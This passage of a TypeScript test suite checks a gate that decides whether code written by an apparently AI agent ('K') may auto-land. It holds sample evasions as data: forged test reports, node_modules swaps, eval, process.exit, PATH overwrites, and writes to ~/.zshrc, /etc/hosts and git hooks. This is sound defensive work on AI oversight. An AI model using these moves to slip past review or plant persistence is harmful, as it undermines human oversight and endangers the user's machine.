  assert.equal(r.landed, false);
  assert.match(r.reason, /tests failed: system\/kernel\/x.test.ts :: staleness: regression/);
  assert.ok(!calls.some((c) => /git commit/.test(c)));
});

test('autoLand: an untouched file running different cases than at the base holds (forged results)', () => {
  // The candidate's report shows hooks.test.ts passing a case it never had —
  // what crafted runner events or a swallowed failure would look like.
  const forged = junit([['system/tests/hooks.test.ts', ['all good'], false]]).replaceAll(
    '/wt/',
    '/repo/.worktrees/w/',
  );
  const { exec } = suiteExec([], forged);
  const r = autoLand({ ...base(exec), baselineFailures: () => resultOf([[...HOOKS, true]]) });
  assert.equal(r.landed, false);
  assert.match(
    r.reason,
    /test inventory changed in untouched file\(s\): system\/tests\/hooks.test.ts/,
  );
});

test('autoLand: a run whose exit status contradicts its report holds', () => {
  // Exit 0 but the report lists a failure.
  const xml = junit([['system/kernel/x.test.ts', ['ok'], true]]).replaceAll(
    '/wt/',
    '/repo/.worktrees/w/',
  );
  const { exec: inner } = fakeExec();
  const exec: Exec = (cmd, args, o) =>
    cmd === 'sandbox-exec' && args.includes('sh') ? xml : inner(cmd, args, o);
  const r = autoLand({
    ...base(exec),
    baselineFailures: () => resultOf([['system/kernel/x.test.ts', ['ok'], true]]),
  });
  assert.equal(r.landed, false);
  assert.match(r.reason, /without a consistent report/);
});

test('autoLand: a suite failure with no readable report holds (never assumes the base explains it)', () => {
  const { exec } = suiteExec([], '<testsuites></testsuites>');
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /without a consistent report/);
});

test('inventoryDrift: touched files may change; untouched ones must match exactly', () => {
  const b = new Map([
    ['a.test.ts', ['a.test.ts :: x']],
    ['b.test.ts', ['b.test.ts :: y']],
  ]);
  const c = new Map([
    ['a.test.ts', ['a.test.ts :: x', 'a.test.ts :: new']],
    ['b.test.ts', ['b.test.ts :: y']],
  ]);
  assert.deepEqual(inventoryDrift(c, b, ['a.test.ts']), []);
  assert.deepEqual(inventoryDrift(c, b, []), ['a.test.ts']);
  assert.deepEqual(inventoryDrift(new Map([['a.test.ts', ['a.test.ts :: x']]]), b, []), [
    'b.test.ts',
  ]);
});

test('reachViolation: rewriting stdout, exiting early or loading the serializer is held', () => {
  const t = (line: string) => `+++ b/system/kernel/x.ts\n@@ -1 +1 @@\n+${line}\n`;
  for (const line of [
    'process.stdout.write(frame);',
    'process.exitCode = 0;',
    'process.exit(0);',
    "process.on('exit', () => {});",
    'fs.writeSync(1, buf);',
    "fs.writeFileSync('/dev/fd/1', buf);",
    "import v8 from 'node:v8';",
  ]) {
    assert.match(reachViolation(t(line)) ?? '', /adds network/, line);
  }
});

test('autoLand: the baseline is taken before any K-authored code runs', () => {
  const order: string[] = [];
  const { exec: inner } = fakeExec();
  const exec: Exec = (cmd, args, o) => {
    if (cmd === 'sandbox-exec') order.push('candidate');
    return inner(cmd, args, o);
  };
  autoLand({
    ...base(exec),
    baselineFailures: () => {
      order.push('baseline');
      return { failures: new Map(), inventory: new Map([['x.test.ts', ['x.test.ts :: ok']]]) };
    },
  });
  assert.equal(order[0], 'baseline');
  assert.ok(order.length > 1);
});

test('reachViolation: a same-dir test import that can reach out is held', () => {
  const t = '+++ b/system/integrations/builtin/discord/x.test.ts\n@@ -1 +1 @@\n+const h = 1;\n';
  assert.match(
    reachViolation(
      t,
      () => ['./index.ts'],
      () => true,
    ) ?? '',
    /adds imports/,
  );
  assert.equal(
    reachViolation(
      t,
      () => ['./util.ts'],
      () => false,
    ),
    null,
  );
});

test('reachViolation: native-code loading is egress too', () => {
  const t = (line: string) => `+++ b/system/kernel/x.test.ts\n@@ -1 +1 @@\n+${line}\n`;
  for (const line of [
    'process.dlopen(m, p);',
    "const b = process.binding('fs');",
    "import x from './evil.node';",
  ]) {
    assert.match(reachViolation(t(line)) ?? '', /adds network/, line);
  }
  assert.match(
    reachViolation(t('const h = 1;'), () => ['./evil.node']) ?? '',
    /adds imports/,
    'a same-dir native module is not a source import',
  );
});

test('gateSandboxProfile: executable mappings only from system, toolchain and node_modules', () => {
  const p = gateSandboxProfile({
    worktree: '/r/.worktrees/w',
    repoRoot: '/r',
    home: '/Users/sam',
    privDir: '/private/tmp/autoland-x',
    nodeDir: '/Users/sam/.nvm/versions/node/v24/bin',
    listeningPorts: [1],
    tmpEntries: [],
    uid: 501,
  });
  assert.match(p, /\(deny file-map-executable\)\n\(allow file-map-executable /);
  const maps = p.split('\n').find((l) => l.startsWith('(allow file-map-executable')) ?? '';
  assert.ok(
    maps.includes('"/Users/sam/.nvm/versions/node/v24"') && maps.includes('"/r/node_modules"'),
  );
  assert.ok(
    !maps.includes('/private/tmp') && !maps.includes('.worktrees'),
    'nothing the checks can write',
  );
});

test('junitFailures: a nested <failure> element counts, once per test case', () => {
  const xml = [
    '<testsuites><testsuite name="s">',
    '<testcase name="a" file="/wt/x.test.ts"><failure type="testCodeFailure" message="m">boom</failure></testcase>',
    '<testcase name="b" file="/wt/x.test.ts" failure="m"><failure message="m"/></testcase>',
    '<testcase name="c" file="/wt/x.test.ts"></testcase>',
    '</testsuite></testsuites>',
  ].join('');
  assert.deepEqual(Object.fromEntries(junitFailures(xml, ['/wt'])), {
    'x.test.ts :: s > a': 1,
    'x.test.ts :: s > b': 1,
  });
});

test('reachCapableImport: a package or non-inert built-in anywhere in the closure counts', () => {
  const root = mkdtempSync(join(tmpdir(), 'reach-'));
  mkdirSync(join(root, 'system', 'm'), { recursive: true });
  const w = (f: string, src: string) => writeFileSync(join(root, 'system', 'm', f), src);
  w('pure.ts', "import { join } from 'node:path';\nexport const p = join('a', 'b');\n");
  w('upload.ts', "import { put } from '@vercel/blob';\nexport const up = put;\n");
  w('wraps.ts', "export { up } from './upload.ts';\n");
  w('net.ts', "import { connect } from 'node:net';\nexport const c = connect;\n");
  const f = 'system/m/x.test.ts';
  assert.equal(reachCapableImport(root, f, './pure.ts'), false);
  assert.equal(reachCapableImport(root, f, './upload.ts'), true, 'a package import');
  assert.equal(reachCapableImport(root, f, './wraps.ts'), true, 'transitively');
  assert.equal(reachCapableImport(root, f, './net.ts'), true, 'a non-inert built-in');
  assert.equal(reachCapableImport(root, f, './missing.ts'), true, 'unresolvable → worst case');
});

test('autoLand: a passing suite whose report arrived complete lands; a truncated report holds', () => {
  const ok: Array<[string, string[], boolean]> = [['system/kernel/x.test.ts', ['ok'], false]];
  const xml = junit(ok).replaceAll('/wt/', '/repo/.worktrees/w/');
  const baseline = () => resultOf(ok);
  const pass = suiteExec([], xml);
  assert.equal(autoLand({ ...base(pass.exec), baselineFailures: baseline }).landed, true);
  const cut = suiteExec([], xml.replace('</testsuites>', ''));
  const r = autoLand({ ...base(cut.exec), baselineFailures: baseline });
  assert.equal(r.landed, false);
  assert.match(r.reason, /without a consistent report/);
});

test('integrityViolation: aliasing, destructuring and split expressions are caught on whole files', () => {
  const head = (src: string) => () => src;
  const f = ['system/kernel/x.ts'];
  for (const added of [
    'const p = process;\np.stdout.write(frame);',
    'const { stdout } = process;',
    'process?.exit(0);',
    'process\n  .exitCode = 0;',
    'const g = globalThis;',
    'console._stdout.write(x);',
    "fs.writeFileSync('/dev/stdout', x);",
    'fs.writeSync(1, x);',
    'Reflect.apply(f, null, []);',
  ]) {
    assert.match(
      integrityViolation(f, () => `const a = 1;\n${added}\n`, head('const a = 1;\n')) ?? '',
      /touches process\/runtime internals/,
      added,
    );
  }
});

test('integrityViolation: inert process properties and pre-existing uses stay landable', () => {
  const f = ['system/kernel/x.ts'];
  const existing = 'const d = process.env.ROBIN_DIR ?? process.cwd();\nprocess.stdout.write(x);\n';
  assert.equal(
    integrityViolation(
      f,
      () => `${existing}const n = 2;\n`,
      () => existing,
    ),
    null,
  );
  assert.equal(
    integrityViolation(
      f,
      () => 'const t = process.hrtime.bigint(); const p = process.platform;',
      () => '',
    ),
    null,
  );
});

test('integrityViolation: swapping one existing use for a different one is caught (contexts, not counts)', () => {
  const f = ['system/kernel/x.ts'];
  assert.match(
    integrityViolation(
      f,
      () => 'process.stdout.write(frame);\n',
      () => 'process.exit(1);\n',
    ) ?? '',
    /process\.stdout/,
  );
});

test('integrityViolation: deleting a comment cannot pay for real code', () => {
  const f = ['system/kernel/x.ts'];
  assert.match(
    integrityViolation(
      f,
      () => 'process.exit(0);\n',
      () => '// call process.exit(0) here someday\nconst a = 1;\n',
    ) ?? '',
    /process\.exit/,
  );
});

test('integrityViolation: eval, new Function and process.env assignment are sensitive', () => {
  const f = ['system/kernel/x.ts'];
  for (const code of [
    'eval(s);',
    'const g = new Function(s);',
    "process.env.PATH = '/tmp';",
    "process.env['NODE_OPTIONS'] ??= x;",
  ]) {
    assert.match(
      integrityViolation(
        f,
        () => code,
        () => '',
      ) ?? '',
      /touches process/,
      code,
    );
  }
  assert.equal(
    integrityViolation(
      f,
      () => 'const v = process.env.HOME;',
      () => '',
    ),
    null,
    'reading env is inert',
  );
});

test('autoLand: a symlink or other non-regular file mode is held', () => {
  const { exec, calls } = fakeExec({
    raw: ':100644 120000 abc def T\tsystem/kernel/invariants/foo.ts\n:000000 100644 0 1 A\tsystem/kernel/invariants/foo.test.ts\n',
  });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /non-regular file mode: system\/kernel\/invariants\/foo.ts/);
  assert.ok(!calls.some((c) => /tsc --noEmit/.test(c)));
});

test('autoLand: a changed file that exists but cannot be read holds (fail closed)', () => {
  const { exec } = fakeExec({ unreadable: ':system/kernel/invariants/foo.ts' });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /couldn't read a changed file/);
});

test('autoLand: a genuinely new file reads as absent at HEAD and can land', () => {
  const { exec } = fakeExec({ absent: ['HEAD:system/kernel/invariants/foo.test.ts'] });
  assert.equal(autoLand(base(exec)).landed, true);
});

test('integrityViolation: env used as a value and indirect code generation are sensitive', () => {
  const f = ['system/kernel/x.ts'];
  for (const code of [
    'Object.assign(process.env, extra);',
    'const e = process.env; e.PATH = p;',
    'delete process.env.HOME;',
    'run(process.env);',
    'const f = eval; f(s);',
    'const F = Function; F(s)();',
    '(() => {}).constructor(s)();',
    "setTimeout('doEvil()', 0);",
  ]) {
    assert.match(
      integrityViolation(
        f,
        () => code,
        () => '',
      ) ?? '',
      /touches process/,
      code,
    );
  }
  for (const code of [
    'const h = process.env.HOME;',
    "const p = process.env['PATH'];",
    'setTimeout(() => run(), 5);',
  ]) {
    assert.equal(
      integrityViolation(
        f,
        () => code,
        () => '',
      ),
      null,
      code,
    );
  }
});

test('scopeViolation: only reliability code may auto-land; the rest of system/ goes to review', () => {
  for (const ok of [
    [
      'system/kernel/invariants/builtins/integration-staleness.ts',
      'system/kernel/invariants/builtins/integration-staleness.test.ts',
    ],
    ['system/kernel/runtime/health-monitor.ts', 'system/kernel/runtime/health-monitor.test.ts'],
    ['system/kernel/scheduler/claim.ts', 'system/kernel/scheduler/claim.test.ts'],
    [
      'system/integrations/_runtime/scheduler-glue.ts',
      'system/integrations/_runtime/scheduler-glue.test.ts',
    ],
  ]) {
    assert.equal(scopeViolation(ok), null, ok[0]);
  }
  for (const bad of [
    'system/integrations/builtin/discord/index.ts',
    'system/brain/memory/recall.ts',
    'system/kernel/runtime/daemon.ts',
    'system/lib/levenshtein.ts',
  ]) {
    assert.match(
      scopeViolation([bad, 'system/kernel/invariants/x.test.ts']) ?? '',
      /outside the auto-land scope/,
      bad,
    );
  }
});

// ── The checks' toolchain comes from the repo, never the worktree. node_modules is
//    gitignored, so a K-planted copy is invisible to every diff and drift check.

const SANDBOX_IN = {
  worktree: '/r/.worktrees/w',
  repoRoot: '/r',
  home: '/Users/sam',
  privDir: '/private/tmp/autoland-x',
  nodeDir: '/Users/sam/.nvm/versions/node/v24/bin',
  listeningPorts: [],
  tmpEntries: [],
  uid: 501,
};

test("gateEnv: PATH resolves tools from the repo's node_modules, not the worktree's", () => {
  const path = gateEnv(SANDBOX_IN).find((e) => e.startsWith('PATH=')) ?? '';
  assert.ok(path.startsWith('PATH=/r/node_modules/.bin:'), path);
  assert.ok(!path.includes('/r/.worktrees/w'), path);
});

test("gateSandboxProfile: the worktree's node_modules entry can't be replaced", () => {
  const p = gateSandboxProfile(SANDBOX_IN);
  assert.match(p, /\(deny file-write\* \(literal "\/r\/\.worktrees\/w\/node_modules"\)\)/);
});

test("autoLand: a worktree node_modules that isn't the repo's symlink holds before any check runs", () => {
  for (const link of [null, '/Users/sam/evil', '/repo/node_modules/../x']) {
    const { exec, calls } = fakeExec();
    const r = autoLand({ ...base(exec), nodeModulesLink: () => link });
    assert.equal(r.landed, false, String(link));
    assert.match(r.reason, /node_modules/);
    assert.ok(!calls.some((c) => c.includes('sandbox-exec')), 'no check ran');
  }
});

test('autoLand: a nested node_modules or a tsbuildinfo in the worktree holds before any check runs', () => {
  for (const ignored of [
    'node_modules\nsystem/kernel/node_modules/tsx/index.js\n',
    'node_modules\ntsconfig.tsbuildinfo\n',
  ]) {
    const { exec, calls } = fakeExec({ ignored });
    const r = autoLand(base(exec));
    assert.equal(r.landed, false, ignored);
    assert.match(r.reason, /ignored file/);
    assert.ok(!calls.some((c) => c.includes('sandbox-exec')), 'no check ran');
  }
  // Ordinary ignored state (a lab run's output) doesn't block a land.
  const { exec } = fakeExec({ ignored: 'node_modules\nlab/.state/run.json\n.DS_Store\n' });
  assert.equal(autoLand(base(exec)).landed, true);
});

test('autoLand: a node_modules link changed during the checks holds the land', () => {
  const { exec, calls } = fakeExec();
  let n = 0;
  const r = autoLand({
    ...base(exec),
    nodeModulesLink: () => (n++ === 0 ? '/repo/node_modules' : '/private/tmp/x'),
  });
  assert.equal(r.landed, false);
  assert.match(r.reason, /node_modules/);
  assert.ok(!calls.some((c) => /git merge/.test(c)));
});

// ── Filesystem writes. A landed test runs unsandboxed the next time anyone runs the
//    suite, and landed code runs unsandboxed in the daemon — a new write must land
//    inside a fresh mkdtemp dir, or wait for review.

const TMP_FIXTURE = [
  "import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';",
  "import { tmpdir } from 'node:os';",
  "import { join } from 'node:path';",
  "const dir = mkdtempSync(join(tmpdir(), 'kn-'));",
].join('\n');

test('fsWriteViolation: writes provably inside a fresh mkdtemp dir pass', () => {
  const f = ['system/kernel/x.test.ts'];
  for (const added of [
    "writeFileSync(join(dir, 'a.json'), '{}');",
    "mkdirSync(join(dir, 'sub', 'deep'), { recursive: true });",
    'rmSync(dir, { recursive: true, force: true });',
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal source text, not a template
    'writeFileSync(`${dir}/a.json`, x);',
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal source text, not a template
    "let d2: string;\nd2 = mkdtempSync(`${tmpdir()}/kn-`);\nwriteFileSync(join(d2, 'b'), x);",
    "const sub = join(dir, 'state');\nwriteFileSync(join(sub, 'c.json'), x);",
  ]) {
    assert.equal(
      fsWriteViolation(
        f,
        () => `${TMP_FIXTURE}\n${added}\n`,
        () => TMP_FIXTURE,
      ),
      null,
      added,
    );
  }
});

test('fsWriteViolation: a new write anywhere else is held, in tests and code alike', () => {
  for (const file of ['system/kernel/x.test.ts', 'system/kernel/x.ts']) {
    for (const added of [
      "writeFileSync(join(homedir(), '.zshrc'), x);",
      "writeFileSync('githooks/pre-commit', x);",
      "appendFileSync('/Users/sam/.profile', x);",
      "writeFileSync(join(dir, '..', '..', 'x'), x);",
      'writeFileSync(join(dir, name), x);',
      "writeFileSync(join(tmpdir(), 'fixed-name'), x);",
      "mkdtempSync(join('/Users/sam', 'x-'));",
      'const p = statePath;\nwriteFileSync(p, x);',
      "let d3 = mkdtempSync(join(tmpdir(), 'a'));\nd3 = '/etc';\nwriteFileSync(join(d3, 'b'), x);",
      "await fsp.writeFile('/etc/hosts', x);",
      "symlinkSync('/Users/sam/.zshrc', join(dir, 'l'));\ncopyFileSync(src, '/Users/sam/.zshrc');",
    ]) {
      assert.match(
        fsWriteViolation(
          [file],
          () => `${TMP_FIXTURE}\n${added}\n`,
          () => TMP_FIXTURE,
        ) ?? '',
        /writes files outside a fresh temp dir/,
        `${file}: ${added}`,
      );
    }
  }
});

test('fsWriteViolation: aliased, computed and namespace-escaping writes are held', () => {
  const f = ['system/kernel/x.ts'];
  for (const added of [
    'const w = writeFileSync;\nw(p, x);',
    "fs['writeFileSync'](p, x);",
    "fs['write' + 'FileSync'](p, x);",
    'const f2 = fs;',
    'const o = { writeFileSync };',
    "const pr = fs.promises;\npr['write' + 'File'](p, x);",
  ]) {
    assert.match(
      fsWriteViolation(
        f,
        () => `import * as fs from 'node:fs';\n${added}\n`,
        () => "import * as fs from 'node:fs';\n",
      ) ?? '',
      /writes files outside a fresh temp dir/,
      added,
    );
  }
});

test('fsWriteViolation: new home-directory references are held', () => {
  const f = ['system/kernel/x.test.ts'];
  for (const added of [
    'const h = homedir();',
    'const h = userInfo().homedir;',
    'const h = process.env.HOME;',
    "const h = process.env['HOME'];",
  ]) {
    assert.match(
      fsWriteViolation(
        f,
        () => `const a = 1;\n${added}\n`,
        () => 'const a = 1;\n',
      ) ?? '',
      /home/,
      added,
    );
  }
});

test('fsWriteViolation: an unproven write already in a changed file holds; so does a rewritten one', () => {
  const f = ['system/kernel/x.ts'];
  const existing = 'writeFileSync(statePath, body);\n';
  assert.match(
    fsWriteViolation(
      f,
      () => `${existing}const n = 2;\n`,
      () => existing,
    ) ?? '',
    /writeFileSync\(statePath\)/,
    'a state-writing module goes to review whatever else changed',
  );
  assert.match(
    fsWriteViolation(
      f,
      () => "writeFileSync(join(cfgDir, 'x'), body);\n",
      () => existing,
    ) ?? '',
    /cfgDir/,
    'same count, different target',
  );
  // Defining a method or mock named like an fs call isn't a write.
  assert.equal(
    fsWriteViolation(
      ['system/kernel/x.test.ts'],
      () => 'const fake = { writeFile: async () => {}, mkdir() {} };\n',
      () => '',
    ),
    null,
  );
});

test('autoLand: a diff that adds a write outside a temp dir is held before verification', () => {
  const file = 'system/kernel/invariants/foo.test.ts';
  const { exec, calls } = fakeExec({
    shown: { [`:${file}`]: "writeFileSync(join(homedir(), '.zshrc'), x);\n" },
  });
  const r = autoLand(base(exec));
  assert.equal(r.landed, false);
  assert.match(r.reason, /writes files outside a fresh temp dir/);
  assert.ok(!calls.some((c) => c.includes('sandbox-exec')), 'no check ran');
});

test('fsWriteViolation: temp-dir factories (arrow or function) count as fresh temp dirs', () => {
  const f = ['system/kernel/x.test.ts'];
  for (const added of [
    "const mk = () => mkdtempSync(join(tmpdir(), 'b-'));\nconst d = mk();\nwriteFileSync(join(d, 'a.json'), x);",
    "function makeTemp(): string {\n  const t = mkdtempSync(join(tmpdir(), 'c-'));\n  mkdirSync(join(t, 'sub'));\n  return t;\n}\nwriteFileSync(join(makeTemp(), 'b'), x);",
  ]) {
    assert.equal(
      fsWriteViolation(
        f,
        () => `${TMP_FIXTURE}\n${added}\n`,
        () => TMP_FIXTURE,
      ),
      null,
      added,
    );
  }
  // A factory with any return outside a temp dir is no factory.
  assert.match(
    fsWriteViolation(
      f,
      () =>
        `${TMP_FIXTURE}\nfunction pick(a: boolean) {\n  if (a) return '/etc';\n  return mkdtempSync(join(tmpdir(), 'd-'));\n}\nwriteFileSync(join(pick(true), 'b'), x);\n`,
      () => TMP_FIXTURE,
    ) ?? '',
    /writes files outside a fresh temp dir/,
  );
});

test("fsWriteViolation: fields and locals named like fs calls (open, rm, link) aren't writes", () => {
  assert.equal(
    fsWriteViolation(
      ['system/kernel/x.ts'],
      () =>
        'const open = alerts.filter((a) => a.open);\nif (row.open) db.open();\nconst n = open.length;\nsession.rm(id);\n',
      () => '',
    ),
    null,
  );
  // …unless they really are fs: a named import, or a call on an fs namespace.
  for (const src of [
    "import { rm } from 'node:fs/promises';\nawait rm(target, { recursive: true });\n",
    "import * as fs from 'node:fs';\nfs.rm(target, () => {});\n",
    "import * as fs from 'node:fs';\nawait fs.promises.open(target, 'w');\n",
  ]) {
    assert.match(
      fsWriteViolation(
        ['system/kernel/x.ts'],
        () => src,
        () => '',
      ) ?? '',
      /writes files outside a fresh temp dir/,
      src,
    );
  }
});

test('fsWriteViolation: fails closed — any unproven write in a changed file holds, even an unchanged call', () => {
  const f = ['system/kernel/x.ts'];
  // The call text is identical; only what `statePath` is bound to changed.
  assert.match(
    fsWriteViolation(
      f,
      () => "const statePath = '/Users/sam/.zshrc';\nwriteFileSync(statePath, body);\n",
      () => "const statePath = join(dataDir, 'state.json');\nwriteFileSync(statePath, body);\n",
    ) ?? '',
    /writes files outside a fresh temp dir: system\/kernel\/x\.ts: writeFileSync\(statePath\)/,
  );
  // A new caller of a writer defined in the same file.
  assert.match(
    fsWriteViolation(
      f,
      () =>
        "function save(p: string) {\n  writeFileSync(p, body);\n}\nsave('githooks/pre-commit');\n",
      () => 'function save(p: string) {\n  writeFileSync(p, body);\n}\n',
    ) ?? '',
    /writes files outside a fresh temp dir/,
  );
  // Writes provably inside a temp dir still pass.
  assert.equal(
    fsWriteViolation(
      ['system/kernel/x.test.ts'],
      () => `${TMP_FIXTURE}\nwriteFileSync(join(dir, 'a.json'), x);\n`,
      () => TMP_FIXTURE,
    ),
    null,
  );
});
